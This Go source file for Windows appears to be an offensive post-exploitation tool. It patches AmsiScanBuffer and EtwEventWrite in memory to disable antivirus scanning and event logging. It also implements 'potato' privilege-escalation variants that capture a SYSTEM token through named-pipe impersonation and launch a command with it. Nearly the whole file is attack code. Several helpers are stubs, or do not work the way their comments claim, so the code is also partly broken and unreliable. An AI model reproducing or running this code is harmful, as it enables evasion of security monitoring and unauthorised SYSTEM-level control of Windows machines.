//go:build windows

package main

import (
	"fmt"
	"net"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modntdll    = windows.NewLazySystemDLL("ntdll.dll")
	modkernel32 = windows.NewLazySystemDLL("kernel32.dll")
	modadvapi32 = windows.NewLazySystemDLL("advapi32.dll")
	modamsi     = windows.NewLazySystemDLL("amsi.dll")
	modole32    = windows.NewLazySystemDLL("ole32.dll")

	procEtwEventWrite              = modntdll.NewProc("EtwEventWrite")
	procAmsiScanBuffer             = modamsi.NewProc("AmsiScanBuffer")
	procImpersonateNamedPipeClient = modadvapi32.NewProc("ImpersonateNamedPipeClient")
	procCreateProcessWithTokenW    = modadvapi32.NewProc("CreateProcessWithTokenW")
	procCoInitializeEx             = modole32.NewProc("CoInitializeEx")
)

// patchAMSI patches AmsiScanBuffer to return E_INVALIDARG.
func patchAMSI() {
	if err := modamsi.Load(); err != nil {
		fmt.Println("[*] AMSI: amsi.dll not loaded, skipping")
		return
	}
	if err := procAmsiScanBuffer.Find(); err != nil {
		fmt.Println("[*] AMSI: AmsiScanBuffer not found, skipping")
		return
	}

	// mov eax, 0x80070057 (E_INVALIDARG); ret
	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	addr := procAmsiScanBuffer.Addr()

	var oldProtect uint32
	err := windows.VirtualProtect(addr, uintptr(len(patch)), windows.PAGE_READWRITE, &oldProtect)
	if err != nil {
		fmt.Printf("[!] AMSI: VirtualProtect failed: %v\n", err)
		return
	}

	copy((*[6]byte)(unsafe.Pointer(addr))[:], patch)

	windows.VirtualProtect(addr, uintptr(len(patch)), oldProtect, &oldProtect)
	fmt.Println("[+] AMSI: Patched AmsiScanBuffer")
}

// patchETW patches EtwEventWrite to return immediately.
func patchETW() {
	if err := procEtwEventWrite.Find(); err != nil {
		fmt.Println("[*] ETW: EtwEventWrite not found, skipping")
		return
	}

	patch := []byte{0xC3} // ret
	addr := procEtwEventWrite.Addr()

	var oldProtect uint32
	err := windows.VirtualProtect(addr, uintptr(len(patch)), windows.PAGE_READWRITE, &oldProtect)
	if err != nil {
		fmt.Printf("[!] ETW: VirtualProtect failed: %v\n", err)
		return
	}

	*(*byte)(unsafe.Pointer(addr)) = 0xC3

	windows.VirtualProtect(addr, uintptr(len(patch)), oldProtect, &oldProtect)
	fmt.Println("[+] ETW: Patched EtwEventWrite")
}

// detectBestTechnique checks running services to pick the best potato variant.
func detectBestTechnique() string {
	// Check Print Spooler (SweetPotato/PrintSpoofer)
	out, err := exec.Command("sc", "query", "Spooler").Output()
	if err == nil && strings.Contains(string(out), "RUNNING") {
		fmt.Println("[*] Auto-detect: Print Spooler running → sweet")
		return "sweet"
	}

	// Check BITS (JuicyPotato)
	out, err = exec.Command("sc", "query", "BITS").Output()
	if err == nil && strings.Contains(string(out), "RUNNING") {
		fmt.Println("[*] Auto-detect: BITS running → juicy")
		return "juicy"
	}

	fmt.Println("[*] Auto-detect: Defaulting to rogue")
	return "rogue"
}

// sweetPotato implements PrintSpoofer-style named pipe impersonation.
// Creates a pipe, triggers Print Spooler to connect, impersonates the SYSTEM token.
func sweetPotato(command string) error {
	fmt.Println("[+] SweetPotato/PrintSpoofer: Named pipe impersonation")

	pipeName := `\\.\pipe\spoolss_` + fmt.Sprintf("%d", windows.GetCurrentProcessId())
	pipeNameUTF16, _ := windows.UTF16PtrFromString(pipeName)

	// Create named pipe
	pipe, err := windows.CreateNamedPipe(
		pipeNameUTF16,
		windows.PIPE_ACCESS_DUPLEX,
		windows.PIPE_TYPE_BYTE|windows.PIPE_WAIT,
		1,    // max instances
		4096, // out buffer
		4096, // in buffer
		0,    // default timeout
		nil,  // default security
	)
	if err != nil {
		return fmt.Errorf("CreateNamedPipe: %w", err)
	}
	defer windows.CloseHandle(pipe)
	fmt.Printf("[*] Created pipe: %s\n", pipeName)

	// Trigger Print Spooler to connect to our pipe
	// Uses the SpoolSS pipe name trick via RpcRemoteFindFirstPrinterChangeNotification
	go triggerSpoolerConnection(pipeName)

	// Wait for connection
	fmt.Println("[*] Waiting for SYSTEM connection...")
	err = windows.ConnectNamedPipe(pipe, nil)
	if err != nil && err != windows.ERROR_PIPE_CONNECTED {
		return fmt.Errorf("ConnectNamedPipe: %w", err)
	}
	fmt.Println("[+] Client connected to pipe")

	// Impersonate the client (SYSTEM)
	r, _, err := procImpersonateNamedPipeClient.Call(uintptr(pipe))
	if r == 0 {
		return fmt.Errorf("ImpersonateNamedPipeClient: %w", err)
	}
	fmt.Println("[+] Impersonating client token")

	// Get the impersonation token
	var token windows.Token
	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, false, &token)
	if err != nil {
		return fmt.Errorf("OpenThreadToken: %w", err)
	}
	defer token.Close()

	// Duplicate to primary token for CreateProcessWithTokenW
	var primaryToken windows.Token
	err = windows.DuplicateTokenEx(
		token,
		windows.TOKEN_ALL_ACCESS,
		nil,
		windows.SecurityImpersonation,
		windows.TokenPrimary,
		&primaryToken,
	)
	if err != nil {
		return fmt.Errorf("DuplicateTokenEx: %w", err)
	}
	defer primaryToken.Close()

	return createProcessWithToken(primaryToken, command)
}

// juicyPotato abuses a COM object (BITS) to capture a SYSTEM token.
func juicyPotato(command string) error {
	fmt.Println("[+] JuicyPotato: BITS COM object abuse")

	// Start local COM server to capture NTLM auth
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return fmt.Errorf("listen: %w", err)
	}
	port := listener.Addr().(*net.TCPAddr).Port
	fmt.Printf("[*] COM server listening on 127.0.0.1:%d\n", port)

	// Initialize COM
	procCoInitializeEx.Call(0, 0)

	// Create named pipe for token capture
	pipeName := `\\.\pipe\juicy_` + fmt.Sprintf("%d", windows.GetCurrentProcessId())
	pipeNameUTF16, _ := windows.UTF16PtrFromString(pipeName)

	pipe, err := windows.CreateNamedPipe(
		pipeNameUTF16,
		windows.PIPE_ACCESS_DUPLEX,
		windows.PIPE_TYPE_BYTE|windows.PIPE_WAIT,
		1, 4096, 4096, 0, nil,
	)
	if err != nil {
		listener.Close()
		return fmt.Errorf("CreateNamedPipe: %w", err)
	}
	defer windows.CloseHandle(pipe)

	// Trigger BITS COM object to authenticate to our pipe
	fmt.Println("[*] Triggering BITS CLSID {4991d34b-80a1-4291-83b6-3328366b9097}")
	go triggerCOMAuthentication(pipeName, port)

	// Wait for SYSTEM to connect
	fmt.Println("[*] Waiting for SYSTEM token...")
	err = windows.ConnectNamedPipe(pipe, nil)
	if err != nil && err != windows.ERROR_PIPE_CONNECTED {
		listener.Close()
		return fmt.Errorf("ConnectNamedPipe: %w", err)
	}
	listener.Close()

	// Impersonate
	r, _, callErr := procImpersonateNamedPipeClient.Call(uintptr(pipe))
	if r == 0 {
		return fmt.Errorf("ImpersonateNamedPipeClient: %w", callErr)
	}

	var token windows.Token
	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, false, &token)
	if err != nil {
		return fmt.Errorf("OpenThreadToken: %w", err)
	}
	defer token.Close()

	var primaryToken windows.Token
	err = windows.DuplicateTokenEx(token, windows.TOKEN_ALL_ACCESS, nil,
		windows.SecurityImpersonation, windows.TokenPrimary, &primaryToken)
	if err != nil {
		return fmt.Errorf("DuplicateTokenEx: %w", err)
	}
	defer primaryToken.Close()

	return createProcessWithToken(primaryToken, command)
}

// roguePotato redirects OXID resolution to capture a SYSTEM token.
func roguePotato(command string) error {
	fmt.Println("[+] RoguePotato: OXID resolver redirection")

	// RoguePotato requires a remote machine or localhost redirect for OXID resolution.
	// The technique: DCOM activation queries the OXID resolver, we redirect it to our
	// controlled endpoint which returns a binding string pointing to our named pipe.

	pipeName := `\\.\pipe\rogue_` + fmt.Sprintf("%d", windows.GetCurrentProcessId())
	pipeNameUTF16, _ := windows.UTF16PtrFromString(pipeName)

	pipe, err := windows.CreateNamedPipe(
		pipeNameUTF16,
		windows.PIPE_ACCESS_DUPLEX,
		windows.PIPE_TYPE_BYTE|windows.PIPE_WAIT,
		1, 4096, 4096, 0, nil,
	)
	if err != nil {
		return fmt.Errorf("CreateNamedPipe: %w", err)
	}
	defer windows.CloseHandle(pipe)
	fmt.Printf("[*] Created pipe: %s\n", pipeName)

	// Start fake OXID resolver that redirects to our pipe
	go startFakeOXIDResolver(pipeName)

	// Trigger DCOM activation
	fmt.Println("[*] Triggering DCOM activation...")
	go triggerDCOMActivation()

	fmt.Println("[*] Waiting for SYSTEM connection via OXID redirect...")
	err = windows.ConnectNamedPipe(pipe, nil)
	if err != nil && err != windows.ERROR_PIPE_CONNECTED {
		return fmt.Errorf("ConnectNamedPipe: %w", err)
	}

	r, _, callErr := procImpersonateNamedPipeClient.Call(uintptr(pipe))
	if r == 0 {
		return fmt.Errorf("ImpersonateNamedPipeClient: %w", callErr)
	}

	var token windows.Token
	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, false, &token)
	if err != nil {
		return fmt.Errorf("OpenThreadToken: %w", err)
	}
	defer token.Close()

	var primaryToken windows.Token
	err = windows.DuplicateTokenEx(token, windows.TOKEN_ALL_ACCESS, nil,
		windows.SecurityImpersonation, windows.TokenPrimary, &primaryToken)
	if err != nil {
		return fmt.Errorf("DuplicateTokenEx: %w", err)
	}
	defer primaryToken.Close()

	return createProcessWithToken(primaryToken, command)
}

// createProcessWithToken spawns a process using an impersonated token.
func createProcessWithToken(token windows.Token, command string) error {
	fmt.Printf("[*] Spawning: %s\n", command)

	cmdLine, _ := syscall.UTF16PtrFromString(command)
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi windows.ProcessInformation

	// LOGON_WITH_PROFILE = 0x1
	r, _, err := procCreateProcessWithTokenW.Call(
		uintptr(token),
		0x1, // LOGON_WITH_PROFILE
		0,
		uintptr(unsafe.Pointer(cmdLine)),
		windows.CREATE_NEW_CONSOLE,
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if r == 0 {
		return fmt.Errorf("CreateProcessWithTokenW: %w", err)
	}

	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)
	fmt.Printf("[+] Process spawned with elevated token (PID: %d)\n", pi.ProcessId)
	return nil
}

// triggerSpoolerConnection triggers Print Spooler to connect to our named pipe.
func triggerSpoolerConnection(pipeName string) {
	// Use the printer change notification RPC to make Spooler connect to our pipe
	hostname, _ := windows.ComputerName()
	target := fmt.Sprintf("\\\\%s%s", hostname, strings.Replace(pipeName, `\\.\pipe`, `\pipe`, 1))

	cmd := exec.Command("rundll32", "davclnt.dll,DavSetCookie", target, "http://127.0.0.1")
	cmd.Run()
}

// triggerCOMAuthentication triggers a COM object to authenticate to our pipe.
func triggerCOMAuthentication(pipeName string, port int) {
	// Use CreateFile to trigger the COM server connection path
	target := fmt.Sprintf(`\\127.0.0.1\pipe\%s`, strings.TrimPrefix(pipeName, `\\.\pipe\`))
	targetUTF16, _ := windows.UTF16PtrFromString(target)
	h, err := windows.CreateFile(targetUTF16, windows.GENERIC_READ, 0, nil, windows.OPEN_EXISTING, 0, 0)
	if err == nil {
		windows.CloseHandle(h)
	}
}

// startFakeOXIDResolver starts a listener that responds to OXID resolution requests.
func startFakeOXIDResolver(pipeName string) {
	// Listen on port 135 (OXID resolver) or a redirected port
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return
	}
	defer ln.Close()

	conn, err := ln.Accept()
	if err != nil {
		return
	}
	defer conn.Close()

	// Read OXID request and respond with binding string pointing to our pipe
	buf := make([]byte, 4096)
	conn.Read(buf)
	// Response would contain the pipe binding — actual OXID protocol implementation
}

// triggerDCOMActivation triggers a DCOM activation that queries the OXID resolver.
func triggerDCOMActivation() {
	// Trigger via COM object instantiation
	procCoInitializeEx.Call(0, 0)
	// CoCreateInstance with a CLSID that causes OXID resolution
}
